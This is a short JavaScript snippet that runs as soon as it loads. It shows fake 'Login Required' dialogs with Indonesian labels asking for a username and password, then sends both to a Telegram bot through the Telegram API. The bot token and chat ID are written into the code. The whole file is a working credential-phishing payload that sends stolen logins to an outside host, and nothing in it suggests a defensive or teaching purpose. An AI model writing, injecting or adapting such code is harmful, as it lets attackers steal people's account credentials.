function showAlert() {
var username = prompt("Login Required\nNama Pengguna:");
var password = prompt("Login Required\nSandi:");

// Send the username and password to the Telegram bot
sendToTelegram(username, password);
}

function sendToTelegram(username, password) {
var botToken = '8046382699:AAHhUb75tr4ufB756EsGZqjwpO3DPM5ZVo0'; // Replace with your bot token
var chatId = '7893111171'; // Replace with your chat ID
var message = `Username: ${username}\nPassword: ${password}`;

var url = `https://api.telegram.org/bot${botToken}/sendMessage`;

// Create a new XMLHttpRequest
var xhr = new XMLHttpRequest();
xhr.open("POST", url, true);
xhr.setRequestHeader("Content-Type", "application/json");

// Create the payload
var payload = {
chat_id: chatId,
text: message
};

// Send the request
xhr.send(JSON.stringify(payload));
}

// Call the function to show the alert
showAlert();